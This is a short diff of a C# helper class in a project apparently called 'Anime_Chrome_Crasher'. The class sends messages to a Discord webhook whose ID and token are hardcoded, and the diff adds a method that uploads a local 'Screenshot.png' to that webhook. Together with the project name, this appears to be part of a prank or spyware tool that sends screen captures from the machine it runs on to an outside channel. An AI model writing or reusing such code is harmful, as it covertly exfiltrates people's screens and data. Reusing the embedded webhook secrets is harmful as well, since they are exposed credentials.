@@ -1,13 +1,22 @@
 ﻿using Discord.Webhook;
+using System.IO;
 
 namespace Anime_Chrome_Crasher
 {
     class WeebHook
     {
+        static DiscordWebhookClient discord = new DiscordWebhookClient(535418425393020939, "13xLgUxSCQa4LuNw7q40FDf21CYSVmHhwuHIhAolxHnljnWOP9Jb7emR1pcwMq55RlGl");
+
         public static void SendMessage(string message)
         {
-            DiscordWebhookClient discord = new DiscordWebhookClient(534522813999712223, "HL3z8PCYFgJeqOZjB5BEFCjivcqeX-4ZBnF4headlsA-BRhI8wv-fmmy_WF7Ndmlke");
             discord.SendMessageAsync(message);
         }
-    }
+
+        public static void SendImage()
+        {
+            if (File.Exists("Screenshot.png")) {
+                discord.SendFileAsync("Screenshot.png", "");
+            }
+        }
+    }   
 }
